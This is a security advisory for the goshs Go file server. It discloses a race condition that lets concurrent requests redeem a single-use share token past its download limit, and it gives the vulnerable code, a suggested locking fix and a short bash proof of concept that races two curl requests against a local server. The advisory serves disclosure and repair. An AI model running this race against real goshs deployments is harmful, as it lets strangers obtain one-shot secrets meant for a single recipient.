# [M] goshs: Share-link ?token=… redemption races past download limit

## Summary
Severity: Medium
Advisory: GHSA-j48m-h7xq-2xpj
CVE: CVE-2026-50139
CWE: CWE-362
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-j48m-h7xq-2xpj
Type: github-advisory

## Affected
- Go: `goshs.de/goshs/v2` — affected >=0 <2.1.0

## Details
# Share-link `?token=…` redemption races past download limit

**Ecosystem:** Go
**Package:** `goshs.de/goshs/v2` (`github.com/patrickhener/goshs`)
**Affected:** `<= v2.0.9` (every release that shipped the share-link feature)

## Summary

`ShareHandler` reads the share token's `DownloadLimit` under `RLock`, releases the lock, serves the file, then re-acquires the lock to increment the counter. Concurrent requests all read the same `Downloaded`/`DownloadLimit` snapshot, all pass the check, and all are served — exceeding the operator's intended cap.

## Details

[`httpserver/handler.go:968-1018`](https://github.com/patrickhener/goshs/blob/v2.0.9/httpserver/handler.go#L968-L1018):

```go
fs.sharedLinksMu.RLock()
entry, ok := fs.SharedLinks[token]
fs.sharedLinksMu.RUnlock()                       // <-- released here

if entry.DownloadLimit > 0 || entry.DownloadLimit == -1 {
    // ...serve file...                          // <-- whole transfer happens unlocked
}

fs.sharedLinksMu.Lock()                          // <-- re-acquired only now
current.Downloaded++
if current.Downloaded >= current.DownloadLimit { delete(fs.SharedLinks, token) }
fs.sharedLinksMu.Unlock()
```

Between line 978 (`RUnlock`) and line 1008 (`Lock`), any number of goroutines can interleave and each observes the same pre-increment limit.

## Proof of concept

```bash
goshs -p 18000 -d /tmp/r -b admin:pw &
echo data > /tmp/r/f.txt

# operator issues a one-shot share
SHARE=$(curl -su admin:pw "http://localhost:18000/f.txt?share&limit=1")
TK=$(echo "$SHARE" | sed -n 's/.*token=\([^"]*\)".*/\1/p')

# attacker races two redemptions
curl -so /dev/null -w "%{http_code}\n" "http://localhost:18000/?token=$TK" & \
curl -so /dev/null -w "%{http_code}\n" "http://localhost:18000/?token=$TK" & \
wait
# observed: 200 / 200 (both succeed) -> limit=1 redeemed twice
```

Reproduced 5/5 times in a row on a 2026-era M-series Mac during verification.

## Impact

A "single-use" share intended to deliver a one-shot secret can be redeemed N times by N concurrent clients. Combined with any token-leak vector (mail forwarding, browser history, intercepted link, etc.) this multiplies the exfiltration window.

## Suggested fix

Reserve under the write lock *before* serving — refund only if the serve fails:

```go
fs.sharedLinksMu.Lock()
entry, ok := fs.SharedLinks[token]
if !ok || time.Now().After(entry.Expires) ||
   (entry.DownloadLimit != -1 && entry.Downloaded >= entry.DownloadLimit) {
    fs.sharedLinksMu.Unlock(); http.NotFound(w, r); return
}
entry.Downloaded++
if entry.DownloadLimit != -1 && entry.Downloaded >= entry.DownloadLimit {
    delete(fs.SharedLinks, token)
} else {
    fs.SharedLinks[token] = entry
}
fs.sharedLinksMu.Unlock()
// ...serve...
```

Add a regression test that races two requests against a `limit=1` token and asserts exactly one `200`.

Reporter: Nishant Verma. Reproduced against `goshs v2.0.9` (commit `8fc1e91`) on 2026-05-27.

## References
- https://github.com/patrickhener/goshs/security/advisories/GHSA-j48m-h7xq-2xpj
- https://github.com/patrickhener/goshs
